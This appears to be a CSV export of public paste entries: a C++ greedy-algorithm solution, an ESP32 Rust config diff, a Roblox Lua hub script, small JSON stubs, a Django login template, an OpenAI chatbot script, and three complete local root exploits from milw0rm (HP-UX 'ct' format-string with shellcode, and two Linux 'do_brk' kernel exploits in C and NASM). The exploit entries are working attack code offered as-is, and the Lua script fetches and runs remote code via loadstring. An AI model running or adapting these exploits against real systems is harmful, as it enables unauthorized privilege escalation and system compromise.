id,title,username,language,date,content
XdRXQmvR,Untitled,nathaditya,C++,Friday 23rd of February 2024 06:42:06 AM CDT,"class Solution
{
    public:
    //Function to find the maximum number of meetings that can
    //be performed in a meeting room.
    int maxMeetings(int start[], int end[], int n)
    {
        vector <pair<int,int>> vec;
        for(int i = 0 ; i < n; i++){
            vec.push_back({start[i],end[i]});
        }
        
        auto comp = [](pair<int,int> a, pair<int,int> b){
            if(a.second != b.second)
                return(a.second < b.second);
                
            return(a.first < b.first);
        };
        
        sort(vec.begin(), vec.end(), comp);
        int en = -1;
        int ctr = 0;
        for(int i = 0; i < n; i++){
            if(vec[i].first > en){
                ctr++;
                en = vec[i].second;
            }
        }

        return ctr;
    }
};"
iqnYpps5,Untitled,niedzwiedzw,Diff,Friday 23rd of February 2024 06:22:58 AM CDT,"diff --git a/.cargo/config.toml b/.cargo/config.toml
index 7b52192..431674c 100644
--- a/.cargo/config.toml
+++ b/.cargo/config.toml
@@ -1,4 +1,4 @@
-[target.xtensa-esp32s3-none-elf]
+[target.xtensa-esp32-none-elf]
 runner = ""espflash flash --monitor""
 
 
@@ -14,7 +14,7 @@ rustflags = [
   ""link-arg=-nostartfiles"",
 ]
 
-target = ""xtensa-esp32s3-none-elf""
+target = ""xtensa-esp32-none-elf""
 
 [unstable]
 build-std = [""alloc"", ""core""]
diff --git a/Cargo.toml b/Cargo.toml
index 9a433f3..7095ac0 100644
--- a/Cargo.toml
+++ b/Cargo.toml
@@ -7,23 +7,23 @@ license = ""MIT OR Apache-2.0""
 
 
 [dependencies]
-esp32s3-hal = { version = ""0.15.0"", features = [
+esp32-hal = { version = ""0.18.0"", features = [
   ""embassy"",
   ""embassy-executor-thread"",
   ""embassy-time-timg0"",
   ""log"",
 ] }
 esp-backtrace = { version = ""0.11.0"", features = [
-  ""esp32s3"",
+  ""esp32"",
   ""panic-handler"",
   ""exception-handler"",
   ""println"",
 ] }
-esp-println = { version = ""0.9.0"", features = [""esp32s3"", ""log""] }
+esp-println = { version = ""0.9.0"", features = [""esp32"", ""log""] }
 log = { version = ""0.4.20"" }
 esp-alloc = { version = ""0.3.0"" }
 esp-wifi = { version = ""0.3.0"", features = [
-  ""esp32s3"",
+  ""esp32"",
   ""wifi"",
   ""embassy-net"",
   ""wifi-default"",
@@ -48,9 +48,9 @@ heapless = { version = ""0.8.0"", default-features = false }
 embassy-executor = { version = ""0.5.0"", features = [""nightly""] }
 embassy-time = ""0.3.0""
 esp-hal = { git = ""https://github.com/esp-rs/esp-hal"", rev = ""9a95c0a"", features = [
-  ""esp32s3"",
+  ""esp32"",
 ] }
-embassy-time-driver = ""0.1.0""
+embassy-time-driver = ""0.1""
 snafu = { version = ""0.8.0"", default-features = false, features = [
   ""rust_1_61"",
   ""rust_1_65"",
diff --git a/src/main.rs b/src/main.rs
index 5157f79..7de6cd4 100644
--- a/src/main.rs
+++ b/src/main.rs
@@ -16,7 +16,7 @@ use embassy_time::{
     Timer,
 };
 use embedded_svc::wifi::{ClientConfiguration, Configuration, Wifi};
-use esp32s3_hal as hal;
+use esp32_hal as hal;
 use esp_backtrace as _;
 use esp_println::{print, println};
 use esp_wifi::{
"
xA7cPdH7,Instant Script,Natthawat_exe,Lua,Friday 23rd of February 2024 06:04:03 AM CDT,"local ArrayField = loadstring(game:HttpGet(""https://raw.githubusercontent.com/Hosvile/Refinement/main/MC%3AArrayfield%20Library""))()
--Documentation url: https://docs.sirius.menu/community/arrayfield

local Window = ArrayField:CreateWindow({
        Name = ""Instant Hub | Version Preview"",
        LoadingTitle = ""Instant Hub Check"",
        LoadingSubtitle = ""Preview0.5"",
        ConfigurationSaving = {
            Enabled = true,
            FolderName = nil, -- Create a custom folder for your hub/game
            FileName = ""InstantFolder""
        },
        Discord = {
            Enabled = false,
            Invite = ""sirius"", -- The Discord invite code, do not include discord.gg/
            RememberJoins = true -- Set this to false to make them join the discord every time they load it up
        },
        KeySystem = true, -- Set this to true to use our key system
        KeySettings = {
            Title = ""Instant Hub"",
            Subtitle = ""Check System"",
            Note = ""Join the discord (discord.gg/)"",
            FileName = ""InstantHubKeys"",
            SaveKey = false,
            GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like ArrayField to get the key from
            Key = {""ABC-123"",'Bye'},
            Actions = {
                [1] = {
                    Text = 'Click here to copy the key link',
                    OnPress = function()

                    end,
                }
            },
        }
    })
    local Toggle = Tab:CreateToggle({
        Name = ""Toggle Example"",
        Info = {
            Title = 'Slider template',
            Image = '12735851647',
            Description = 'Just a slider for stuff',
        },
        CurrentValue = false,
        Flag = ""Toggle1"",
            print(Value)
        end,
    })
    Tab:CreateSpacing(nil,10)
    local Toggle = Tab:CreateToggle({
        Name = ""Toggle Example"",
        Info = {
            Title = 'Slider template',
            Image = '12735851647',
            Description = 'Just a slider for stuff',
        },
        CurrentValue = false,
        Flag = ""Toggle1"",
        Callback = function(Value)
            print(Value)
        end,
    })
    Tab:CreateSpacing(nil,10)
    local Toggle = Tab:CreateToggle({
        Name = ""Toggle Example"",
        Info = {
            Title = 'Slider template',
            Image = '12735851647',
            Description = 'Just a slider for stuff',
        },
        CurrentValue = false,
        Flag = ""Toggle1"",
        Callback = function(Value)
            print(Value)
        end,
    })
    Tab:CreateSpacing(nil,10)
    local Toggle = Tab:CreateToggle({
        Name = ""Toggle Example"",
        Info = {
            Title = 'Slider template',
            Image = '12735851647',
            Description = 'Just a slider for stuff',
        },
        CurrentValue = false,
        Flag = ""Toggle1"",
        Callback = function(Value)
            print(Value)
        end,
    })
    ToLock.Keybind = Tab:CreateKeybind({
        Name = ""Keybind Example"",
        CurrentKeybind = ""Q"",
        HoldToInteract = false,
        SectionParent = LockTesting,
        Flag = ""Keybind2"",
        Callback = function(Keybind)

        end,
    })+


"
EqvJRw3s,data849,TestGuy1,JSON,Friday 23rd of February 2024 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'cc3b7ad20913152de49e0769c4db31be40d529bdfe57344b5243fcc05d4a796331f07752f3719f3ca7b6885bae637a84f94e6496ed0574da3a89447ce6a5a32d63678b2106e92c5594b5090282ae309233c93337575e5e0e2d2a23eacf8b6eb1860aced1d1f76470278cea0bf432c6095e691875cea3bc1a7cd0566afe265ad0',
  otherdata: [
    '6bc9faf1cd8c25021110697dd16902c6',
    '05ea5ae5f32838ede9b479748e2a384e',
    '7cf15fbc9156b82cb881e2e3052f3d6f',
    'f29542f10652860c90e588064d5dbbb2',
    '7b2da71ed1555ce1b68c794539f98729',
    'bba7b4f34babf5a084a4946f22849c2e',
    'de3dba336f28aad9fc4314963fd2b767',
    'f93c6572e8fdf7567280c44a2674a7c8'
  ]
}"
6eiAFAa6,LoaderVersion,FLORIAN4600,JSON,Friday 23rd of February 2024 05:48:50 AM CDT,"{
	""version"": ""1.1"",
	""url"": """"
}"
sWxWC4Rw,HanomanSimple,PapiGemezs,PHP,Friday 23rd of February 2024 05:09:39 AM CDT,"{
   ""GasSimple"": [
      {
         ""version"": 1.7
      }
   ]
}"
0qExpieR,templates/registrasion/login.html,rezamalik15,HTML,Friday 23rd of February 2024 04:56:17 AM CDT,"{% extends 'main/base.html' %}

{% block title %}Login to Pojok Baca{% endblock title %}

{% block content %}

<div class=""container"">
    <div class=""row vh-100"">

        <div class=""col-6 m-auto shadow"">
            <form action="""">
                {% csrf_token %}
                <h1>Please Login!</h1>
                <div class=""mb-3"">
                    <label class=""form-label"" for=""username"">Username</label>
                    <input class=""form-control"" type=""text"" name=""username"" id=""username"">
                </div>
                <div class=""mb-3"">
                    <label class=""form-label"" for=""password"">Password</label>
                    <input class=""form-control"" type=""text"" name=""password"" id=""password"">
                </div>
                <div class=""mb-3"">
                    <button class=""btn btn-primary"" type=""submit"">Login</button>
                </div>
            </form>
        </div>

    </div>
</div>

{% endblock content %}
    
    "
vYi0t2Q8,HP-UX B11.11 - '/usr/bin/ct' Format String Privilege Escalation - CVE-2003-0090,FlyFar,C,Friday 23rd of February 2024 04:41:35 AM CDT,"/*******************************************************************************
*  File    : x_hp-ux11i_nls_ct.c
*  Usage   : cc x_hp-ux11i_nls_ct.c -o x_ct ; ./x_ct
*  Purpose : Get a local rootshell from /usr/bin/ct,using HP-UX location language format string bug.
*  Author  : watercloud xfocus org 
*  Tested  : On HP-UX B11.11 .
******************************************************************************/


#include<stdio.h>

#define PATH ""PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin""
#define TERM ""TERM=xterm""
#define NLSPATH ""NLSPATH=/tmp/.ex.cat""

#define CMD  ""/usr/bin/ct abc_ ""
#define MSG ""\$set 1\n1128 ""
#define PRT_ARG_NUM 2    
#define STACK_LEN 0x180  

#define ENV_BEGIN 0x40   
#define ENV_LEN   0x40  
#define LOW_STACK 0x210  

char buffer[512];
char buff[72]=
  ""\x0b\x5a\x02\x9a\x34\x16\x03\xe8\x20\x20\x08\x01\xe4\x20\xe0\x08""
  ""\x96\xd6\x04\x16\xeb\x5f\x1f\xfd\x0b\x39\x02\x99\xb7\x5a\x40\x22""
  ""\x0f\x40\x12\x0e\x20\x20\x08\x01\xe4\x20\xe0\x08\xb4\x16\x70\x16""
  ""/bin/shA"";
int * pint = (int *) &buff[56];
unsigned int haddr = 0;      
unsigned int dstaddr = 0;    

int main(argc,argv,env)
int argc;char ** argv;char **env;
{
    unsigned int * pa = (unsigned int*)env;
    FILE * fp = NULL;
    int xnum = (LOW_STACK - ENV_BEGIN + STACK_LEN -56 -12 -36 -PRT_ARG_NUM*4)/4;  

    int alig1= ENV_BEGIN - xnum*8;
    int alig2=0;
    int i=0;

    while(*pa != NULL)    
        *pa++=0;
    
    if(strlen(CMD) >ENV_BEGIN-3)
    {
        printf(""No enough space to alig our env!\n"");
        exit(1);
    }

	printf(""Exploite for HP-UX 11i NLS format bug by command ct.\n"");
	printf(""From watercloud@xfocus.org.  2003-1-4\n"");
	printf(""   Site : http://www.xfocus.net (CN).\n"");
	printf(""   Site : http://www.xfocus.org (EN).\n"");


    haddr = (unsigned int)&fp & 0xffff0000;
    if(alig1 < 0)
      alig1+=0x10000;
    alig2 = (haddr >> 16) - alig1 -xnum*8 ;
    if(alig2 < 0)
      alig2+=0x10000;

    dstaddr= haddr+ LOW_STACK + STACK_LEN -24;  
    *pint++=dstaddr;
    *pint++=dstaddr;
    *pint++=dstaddr;
    *pint = 0;
    
    /* begin to make our .cat file */
    fp = fopen(""/tmp/.ex.k"",""w"");
    if(fp == NULL)
    {
      printf(""open file : /tmp/.ex.k for write error.\n"");
      exit(1);
    }
    fprintf(fp,""%s"",MSG);
    for(;i<xnum;i++)
      fprintf(fp,""%%.8x"");
    fprintf(fp,""%%.%ix%%n"",alig1);
    fprintf(fp,""%%.%ix%%hn"",alig2);
    fclose(fp);
    fp = NULL;
    system(""/usr/bin/gencat /tmp/.ex.cat /tmp/.ex.k"");
    unlink(""/tmp/.ex.k"");


    sprintf(buffer,""TZ=%*s%s%*s"",ENV_BEGIN-3-strlen(CMD),""A"",buff,ENV_BEGIN+ENV_LEN-strlen(buff),""B"");
    putenv(buffer);
    putenv(PATH);
    putenv(TERM);
    putenv(NLSPATH);
    
    printf(""¼ÇµÃÉ¾³ýÕâ¸öÁÙÊ±ÎÄ¼þ(Remember to delete the  file): /tmp/.ex.cat .\n"");
    execl(""/usr/bin/ct"",""/usr/bin/ct"",""abc_"",0);   /* ºÃÏ·¿ªÊ¼ÁË £º£©  */
} 


// milw0rm.com [2003-12-16]"
4A9w2Lgh,Linux Kernel 2.4.22 - 'do_brk()' Local Privilege Escalation (2) - CVE-2003-0961,FlyFar,C,Friday 23rd of February 2024 04:39:14 AM CDT,"/*
* hatorihanzo.c
* Linux kernel do_brk vma overflow exploit.
*
* The bug was found by Paul (IhaQueR) Starzetz <paul@isec.pl>
*
* Further research and exploit development by
* Wojciech Purczynski <cliph@isec.pl> and Paul Starzetz.
*
* (c) 2003 Copyright by IhaQueR and cliph. All Rights Reserved.
*
* COPYING, PRINTING, DISTRIBUTION, MODIFICATION, COMPILATION AND ANY USE
* OF PRESENTED CODE IS STRICTLY PROHIBITED.
*/
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <paths.h>
#include <grp.h>
#include <setjmp.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <sys/ucontext.h>
#include <sys/wait.h>
#include <asm/ldt.h>
#include <asm/page.h>
#include <asm/segment.h>
#include <linux/unistd.h>
#include <linux/linkage.h>
#define kB * 1024
#define MB * 1024 kB
#define GB * 1024 MB
#define MAGIC 0xdefaced /* I should've patented this number -cliph */
#define ENTRY_MAGIC 0
#define ENTRY_GATE 2
#define ENTRY_CS 4
#define ENTRY_DS 6
#define CS ((ENTRY_CS << 2) | 4)
#define DS ((ENTRY_DS << 2) | 4)
#define GATE ((ENTRY_GATE << 2) | 4 | 3)
#define LDT_PAGES ((LDT_ENTRIES*LDT_ENTRY_SIZE+PAGE_SIZE-1) / PAGE_SIZE)
#define TOP_ADDR 0xFFFFE000U
/* configuration */
unsigned task_size;
unsigned page;
uid_t uid;
unsigned address;
int dontexit = 0;
void fatal(char * msg)
{
fprintf(stderr, ""[-] %s: %s\n"", msg, strerror(errno));
if (dontexit) {
fprintf(stderr, ""[-] Unable to exit, entering neverending loop.\n"");
kill(getpid(), SIGSTOP);
for (;;) pause();
}
exit(EXIT_FAILURE);
}
void configure(void)
{
unsigned val;
task_size = ((unsigned)&val + 1 GB ) / (1 GB) * 1 GB;
uid = getuid();
}
void expand(void)
{
unsigned top = (unsigned) sbrk(0);
unsigned limit = address + PAGE_SIZE;
do {
if (sbrk(PAGE_SIZE) == NULL)
fatal(""Kernel seems not to be vulnerable"");
dontexit = 1;
top += PAGE_SIZE;
} while (top < limit);
}
jmp_buf jmp;
#define MAP_NOPAGE 1
#define MAP_ISPAGE 2
void sigsegv(int signo, siginfo_t * si, void * ptr)
{
struct ucontext * uc = (struct ucontext *) ptr;
int error_code = uc->uc_mcontext.gregs[REG_ERR];
(void)signo;
(void)si;
error_code = MAP_NOPAGE + (error_code & 1);
longjmp(jmp, error_code);
}
void prepare(void)
{
struct sigaction sa;
sa.sa_sigaction = sigsegv;
sa.sa_flags = SA_SIGINFO | SA_NOMASK;
sigemptyset(&sa.sa_mask);
sigaction(SIGSEGV, &sa, NULL);
}
int testaddr(unsigned addr)
{
int val;
val = setjmp(jmp);
if (val == 0) {
asm (""verr (%%eax)"" : : ""a"" (addr));
return MAP_ISPAGE;
}
return val;
}
#define map_pages (((TOP_ADDR - task_size) + PAGE_SIZE - 1) / PAGE_SIZE)
#define map_size (map_pages + 8*sizeof(unsigned) - 1) / (8*sizeof(unsigned))
#define next(u, b) do { if ((b = 2*b) == 0) { b = 1; u++; } } while(0)
void map(unsigned * map)
{
unsigned addr = task_size;
unsigned bit = 1;
prepare();
while (addr < TOP_ADDR) {
if (testaddr(addr) == MAP_ISPAGE)
*map |= bit;
addr += PAGE_SIZE;
next(map, bit);
}
signal(SIGSEGV, SIG_DFL);
}
void find(unsigned * m)
{
unsigned addr = task_size;
unsigned bit = 1;
unsigned count;
unsigned tmp;
prepare();
tmp = address = count = 0U;
while (addr < TOP_ADDR) {
int val = testaddr(addr);
if (val == MAP_ISPAGE && (*m & bit) == 0) {
if (!tmp) tmp = addr;
count++;
} else {
if (tmp && count == LDT_PAGES) {
errno = EAGAIN;
if (address)
fatal(""double allocation\n"");
address = tmp;
}
tmp = count = 0U;
}
addr += PAGE_SIZE;
next(m, bit);
}
signal(SIGSEGV, SIG_DFL);
if (address)
return;
errno = ENOTSUP;
fatal(""Unable to determine kernel address"");
}
int modify_ldt(int, void *, unsigned);
void ldt(unsigned * m)
{
struct modify_ldt_ldt_s l;
map(m);
memset(&l, 0, sizeof(l));
l.entry_number = LDT_ENTRIES - 1;
l.seg_32bit = 1;
l.base_addr = MAGIC >> 16;
l.limit = MAGIC & 0xffff;
if (modify_ldt(1, &l, sizeof(l)) == -1)
fatal(""Unable to set up LDT"");
l.entry_number = ENTRY_MAGIC / 2;
if (modify_ldt(1, &l, sizeof(l)) == -1)
fatal(""Unable to set up LDT"");
find(m);
}
asmlinkage void kernel(unsigned * task)
{
unsigned * addr = task;
/* looking for uids */
while (addr[0] != uid || addr[1] != uid ||
addr[2] != uid || addr[3] != uid)
addr++;
addr[0] = addr[1] = addr[2] = addr[3] = 0; /* uids */
addr[4] = addr[5] = addr[6] = addr[7] = 0; /* uids */
addr[8] = 0;
/* looking for vma */
for (addr = (unsigned *) task_size; addr; addr++) {
if (addr[0] >= task_size && addr[1] < task_size &&
addr[2] == address && addr[3] >= task_size) {
addr[2] = task_size - PAGE_SIZE;
addr = (unsigned *) addr[3];
addr[1] = task_size - PAGE_SIZE;
addr[2] = task_size;
break;
}
}
}
void kcode(void);
#define __str(s) #s
#define str(s) __str(s)
void __kcode(void)
{
asm(
""kcode: \n""
"" pusha \n""
"" pushl %es \n""
"" pushl %ds \n""
"" movl $("" str(DS) "") ,%edx \n""
"" movl %edx,%es \n""
"" movl %edx,%ds \n""
"" movl $0xffffe000,%eax \n""
"" andl %esp,%eax \n""
"" pushl %eax \n""
"" call kernel \n""
"" addl $4, %esp \n""
"" popl %ds \n""
"" popl %es \n""
"" popa \n""
"" lret \n""
);
}
void knockout(void)
{
unsigned * addr = (unsigned *) address;
if (mprotect(addr, PAGE_SIZE, PROT_READ|PROT_WRITE) == -1)
fatal(""Unable to change page protection"");
errno = ESRCH;
if (addr[ENTRY_MAGIC] != MAGIC)
fatal(""Invalid LDT entry"");
/* setting call gate and privileged descriptors */
addr[ENTRY_GATE+0] = ((unsigned)CS << 16) | ((unsigned)kcode & 0xffffU);
addr[ENTRY_GATE+1] = ((unsigned)kcode & ~0xffffU) | 0xec00U;
addr[ENTRY_CS+0] = 0x0000ffffU; /* kernel 4GB code at 0x00000000 */
addr[ENTRY_CS+1] = 0x00cf9a00U;
addr[ENTRY_DS+0] = 0x0000ffffU; /* user 4GB code at 0x00000000 */
addr[ENTRY_DS+1] = 0x00cf9200U;
prepare();
if (setjmp(jmp) != 0) {
errno = ENOEXEC;
fatal(""Unable to jump to call gate"");
}
asm(""lcall $"" str(GATE) "",$0x0""); /* this is it */
}
void shell(void)
{
char * argv[] = { _PATH_BSHELL, NULL };
execve(_PATH_BSHELL, argv, environ);
fatal(""Unable to spawn shell\n"");
}
void remap(void)
{
static char stack[8 MB]; /* new stack */
static char * envp[] = { ""PATH="" _PATH_STDPATH, NULL };
static unsigned * m;
static unsigned b;
m = (unsigned *) sbrk(map_size);
if (!m)
fatal(""Unable to allocate memory"");
environ = envp;
asm (""movl %0, %%esp\n"" : : ""a"" (stack + sizeof(stack)));
b = ((unsigned)sbrk(0) + PAGE_SIZE - 1) & PAGE_MASK;
if (munmap((void*)b, task_size - b) == -1)
fatal(""Unable to unmap stack"");
while (b < task_size) {
if (sbrk(PAGE_SIZE) == NULL)
fatal(""Unable to expand BSS"");
b += PAGE_SIZE;
}
ldt(m);
expand();
knockout();
shell();
}
int main(void)
{
configure();
remap();
return EXIT_FAILURE;
}


// milw0rm.com [2003-12-05]"
6FJceUBk,ChatGPT BOT OPEN AI,nicuf,Python,Friday 23rd of February 2024 04:38:14 AM CDT,"import openai

openai.api_key = ""API-KEY""  # https://platform.openai.com/api-keys

def chat_with_gpt(prompt):
    response = openai.completions.create( # Changed
        model=""gpt-3.5-turbo-instruct"", # Changed
        prompt=prompt,
        max_tokens=150
    )

    # Extracting the response
    answer = response.choices[0].text.strip()
    print(""Chatbot:"", answer)

if __name__ == ""__main__"":
    while True:
        user_input = input(""You: "")
        if user_input.lower() in [""quit"", ""exit"", ""bye""]:
            break
        chat_with_gpt(user_input)
response = client.completions.create(
  model=""gpt-3.5-turbo-instruct"",

)"
0ygGtzS7,Linux Kernel 2.4.22 - 'do_brk()' Local Privilege Escalation (1) - CVE-2003-0961,FlyFar,ASM (NASM),Friday 23rd of February 2024 04:35:23 AM CDT,"; E-DB Note: Updated Exploit ~ https://www.exploit-db.com/exploits/131/
;
; Christophe Devine (devine at cr0.net) and Julien Tinnes (julien at cr0.org)
;
; This exploit uses sys_brk directly to expand his break and doesn't rely
; on the ELF loader to do it.
;
; To bypass a check in sys_brk against available memory, we use a high
; virtual address as base address
;
; In most case (let's say when no PaX w/ ASLR :) we have to move the stack
; so that we can expand our break
;


  BITS 32

                org     0xBFFF0000

  ehdr:                                                 ; Elf32_Ehdr
                db      0x7F, ""ELF"", 1, 1, 1            ;   e_ident
        times 9 db      0
                dw      2                               ;   e_type
                dw      3                               ;   e_machine
                dd      1                               ;   e_version
                dd      _start                          ;   e_entry
                dd      phdr - $$                       ;   e_phoff
                dd      0                               ;   e_shoff
                dd      0                               ;   e_flags
                dw      ehdrsize                        ;   e_ehsize
                dw      phdrsize                        ;   e_phentsize
                dw      2                               ;   e_phnum
                dw      0                               ;   e_shentsize
                dw      0                               ;   e_shnum
                dw      0                               ;   e_shstrndx

  ehdrsize      equ     $ - ehdr

  phdr:                                                 ; Elf32_Phdr
                dd      1                               ;   p_type
                dd      0                               ;   p_offset
                dd      $$                              ;   p_vaddr
                dd      $$                              ;   p_paddr
                dd      filesize                        ;   p_filesz
                dd      filesize                        ;   p_memsz
                dd      7                               ;   p_flags
                dd      0x1000                          ;   p_align

  phdrsize      equ     $ - phdr

  _start:

		; ** Make sure the stack is not above us

                mov     eax, 163         ; mremap
                mov     ebx, esp
		
		and	ebx, ~(0x1000 - 1)	; align to page size

		mov	ecx, 0x1000	; we suppose stack is one page only
                mov     edx, 0x9000	; be sure it can't get mapped after
					; us
                mov     esi,1		; MREMAP_MAYMOVE
                int     0x80


		and	esp, (0x1000 - 1)	; offset in page
		add	esp, eax		; stack ptr to new location
						; nb: we don't fix
						; pointers so environ/cmdline
						; are not available

  		mov	eax,152		; mlockall (for tests as root)
  		mov	ebx,2		; MCL_FUTURE
  		int	0x80

		; get VMAs for the kernel memory

                mov     eax,45          ; brk
                mov     ebx,0xC0500000
		int	0x80

		
		mov	ecx, 4
  loop0:
		
  		mov	eax, 2		; fork
  		int	0x80
		loop	loop0

  _idle:

                mov     eax,162         ; nanosleep
                mov     ebx,timespec
                int     0x80
                jmp     _idle

  timespec      dd      10,0

  filesize      equ     $ - $$

; milw0rm.com [2003-12-02]"
